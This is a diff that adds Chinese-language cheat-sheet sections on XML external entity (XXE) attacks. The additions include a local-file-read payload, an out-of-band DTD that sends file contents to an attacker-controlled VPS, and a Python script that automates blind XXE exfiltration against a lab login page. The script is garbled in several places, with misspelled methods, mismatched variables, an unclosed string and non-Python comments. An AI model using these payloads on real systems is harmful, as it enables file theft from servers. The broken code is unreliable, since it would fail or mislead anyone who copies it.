@@ -1803,3 +1803,125 @@ def output_exec(output,type):
 
 </details>
 
+<details>
+<summary>外部实体注入漏洞_XXE_OOB信息传送</summary>
+
+```
+----------------------------------------------------------------------------
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY b SYSTEM "file:///c:/test.txt">
+]>
+<user>
+  <username?&b;</username>
+  <password>admin</password>
+</user>
+----------------------------------------------------------------------------
+//无回响XXE：[1]注释掉 echo $result;[2]增加"error_reporting(0);"
+
+//对无回响的XXE,需要构建一条 带外数据(Out-of Band,OOB)通道读取数据
+//思路：
+//1.攻击者先发送Payload1 给Web服务器
+//2.Payload1 触发Web服务器，Web服务器向VPS获取恶意DTD,并执行Payload2
+//3.Payload2使Web服务器把结果作为参数来访问VPS上的HTTP服务
+//4.攻击者通过VPS的HTTP访问记录得到结果
+----------------------------------------------------------------------------
+在目标服务器无回响的情况下，只能通过OOB信息传送进行XXE攻击
+----------------------------------------------------------------------------
+//在VPS上创建名为evil.xml的恶意DTD文件，并将其放在apache的网页目录下，同时开启apache服务
+
+//evil.xml
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.130/?content=%file;'>"> %payload;
+
+//在VPS上开启对apache访问日志的监控
+# tail -f /var/log/apache2/access.log
+
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/text.txt">
+<!ENTITY % dtd SYSTEM "http://192.168.1.130/evil.xml">
+%dtd;
+%send;
+]>
+
+//点击发送数据包，就可以在VPS上看到HTTP反问记录
+// # tail -f /var/log/apache2/access.log
+----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>外部实体注入漏洞_XXE_检测方法</summary>
+
+```
+----------------------------------------------------------------------------
+// [1] "  "
+// [2] <!  >     -->   "<!           > "
+// [3] \"  \"    -->   "<!  \"      \"> "
+// [4] <!  >     -->   "<!  \"<!    >\">  "
+----------------------------------------------------------------------------
+#!/usr/bin/python3
+# -*- codign: utf-8 -*-
+
+from http.server import HTTPServer, simpleHTTPRequestHandler
+import threading
+import requests
+import sys
+
+def ExportPayload(lop, lport):
+    file = open('evil.xml', 'w')
+    file.write("<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://{0}:{1}/?content=%file;'>\"> %payload;".form(lip, lport))
+    file.close()
+    print("[*] Payload文件创建成功!")
+
+//编写HTTP服务函数，通过http.server模块实现HTTP服务，监听目标服务器返回的数据
+def StartHTTP(lip,lport):
+    serverAddr = (lip, lport)
+    httpd = HTTPServer(serverAddr, MyHandler)
+    print("[*] 正在开启HTTP服务器:\n\n===================\nIP地址：{0}\n端口：{1}\n============\n".format(lip, lport))
+    httpd.serve_forever()
+
+//编写PORT发送函数，用来向目标服务器发送攻击数据
+def SendData(lip, lport, url):
+    filePath = "c:\\test.txt"
+    while True:
+        filePath = filePath.replace('\\', "/")
+        data = "<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY  % file SYSTEM \"php://filter/read=convert.base64-encode/resource={0}\">
+            \n<!ENTITY % dtd SYSTEM \"http://{1}:{2}/evil.xml\">\n%dtd;
+            \n%send;\n].format(filePath, lip, lport)
+        requests.port(url, data=data)
+        filePath = input("Input filePath:")
+
+class MyHandler(SimpleHTTPRequestHandler):
+    def log_message(self, format, *args):
+
+        sys.stderr.write("%s - - [%s] %s\n" %  //终端输出HTTP访问信息
+            (self.client_address[0],
+            self.log_date_time_string(),
+            format%args))
+
+        textFile = open("result.txt", "a")
+        textFile.write("%s - - [%s] %s\n" %
+            (self.client_address[0],
+            self.log_date_time_string(),
+            format%args))
+        textFile.close()
+
+if __name__ == '__main__':
+    lip = "192.168.1.130"
+    lport = 3344
+    url = "http://192.168.1.130/xxe-lab/php_xxe/doLogin.php"
+    Export Payload(lip, lport)
+
+    threadHTTP = threading.Thread(target=StartHTTP, args=(lip, lport)) //HTTP服务线程
+    threadHTTP.start()
+
+    threadPOST = threading.Thread(target=SendData, args=(lip, lport, url)) //发送POST数据线程
+    threadPOST.start()
+
+//运行
+// # python3 Blind_XXE.py
+```
+
+</details>
